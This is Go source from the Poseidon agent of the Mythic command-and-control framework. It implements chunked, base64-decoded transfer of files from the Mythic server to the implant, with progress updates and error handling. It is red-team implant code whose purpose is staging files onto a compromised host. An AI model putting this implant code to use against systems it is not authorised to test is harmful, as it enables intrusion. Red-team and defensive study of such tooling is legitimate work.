package files

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var GetFromMythicChannel = make(chan structs.GetFileFromMythicStruct, 10)

// listenForGetFromMythicMessages reads from GetFromMythicChannel to get a file from Mythic to the agent
func listenForGetFromMythicMessages() {
	for {
		select {
		case getFile := <-GetFromMythicChannel:
			getFile.TrackingUUID = utils.GenerateSessionID()
			getFile.FileTransferResponse = make(chan json.RawMessage)
			getFile.Task.Job.FileTransfers[getFile.TrackingUUID] = getFile.FileTransferResponse
			sendUploadFileMessagesToMythic(getFile)
		}
	}
}

// sendUploadFileMessagesToMythic sends messages to Mythic to transfer a file from Mythic to Agent
func sendUploadFileMessagesToMythic(getFileFromMythic structs.GetFileFromMythicStruct) {
	// when we're done fetching the file, send a 0 byte length byte array to the getFileFromMythic.ReceivedChunkChannel
	fileUploadData := structs.FileUploadMessage{}
	fileUploadData.FileID = getFileFromMythic.FileID
	fileUploadData.ChunkSize = 512000
	fileUploadData.ChunkNum = 1
	fileUploadData.FullPath = getFileFromMythic.FullPath

	fileUploadMsg := structs.Response{}
	fileUploadMsg.TaskID = getFileFromMythic.Task.TaskID
	fileUploadMsg.Upload = &fileUploadData
	fileUploadMsg.TrackingUUID = getFileFromMythic.TrackingUUID

	getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
	rawData := <-getFileFromMythic.FileTransferResponse
	fileUploadMsgResponse := structs.FileUploadMessageResponse{} // Unmarshal the file upload response from mythic
	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = getFileFromMythic.Task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
		getFileFromMythic.Task.Job.SendResponses <- errResponse
		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
		return
	}
	// inform the user that we started getting data and let them know how many chunks it'll be
	if getFileFromMythic.SendUserStatusUpdates {
		response := structs.Response{}
		response.Completed = false
		response.TaskID = getFileFromMythic.Task.TaskID
		response.UserOutput = fmt.Sprintf("Fetching file from Mythic with %d total chunks at %d bytes per chunk\n", fileUploadMsgResponse.TotalChunks, fileUploadData.ChunkSize)
		getFileFromMythic.Task.Job.SendResponses <- response
	}
	// start handling the data and sending it to the requesting task
	decoded, err := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = getFileFromMythic.Task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
		getFileFromMythic.Task.Job.SendResponses <- errResponse
		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
		return
	}
	getFileFromMythic.ReceivedChunkChannel <- decoded
	// track the percentage of completion for file transfer for users so it's easier to see
	lastPercentCompleteNotified := 0
	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			if getFileFromMythic.Task.ShouldStop() {
				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
				return
			}
			// update to the next chunk
			fileUploadMsg.Upload.ChunkNum = index
			// send the request
			getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
			// get the response
			rawData := <-getFileFromMythic.FileTransferResponse
			fileUploadMsgResponse = structs.FileUploadMessageResponse{} // Unmarshal the file upload response from apfell
			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = getFileFromMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
				getFileFromMythic.Task.Job.SendResponses <- errResponse
				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
				return
			}
			// Base64 decode the chunk data
			decoded, err := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = getFileFromMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
				getFileFromMythic.Task.Job.SendResponses <- errResponse
				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
				return
			}
			getFileFromMythic.ReceivedChunkChannel <- decoded
			newPercentComplete := ((index * 100) / fileUploadMsgResponse.TotalChunks)
			if newPercentComplete/10 > lastPercentCompleteNotified && getFileFromMythic.SendUserStatusUpdates {
				response := structs.Response{}
				response.Completed = false
				response.TaskID = getFileFromMythic.Task.TaskID
				response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
				getFileFromMythic.Task.Job.SendResponses <- response
				lastPercentCompleteNotified = newPercentComplete / 10
			}
		}
	}
	getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
}
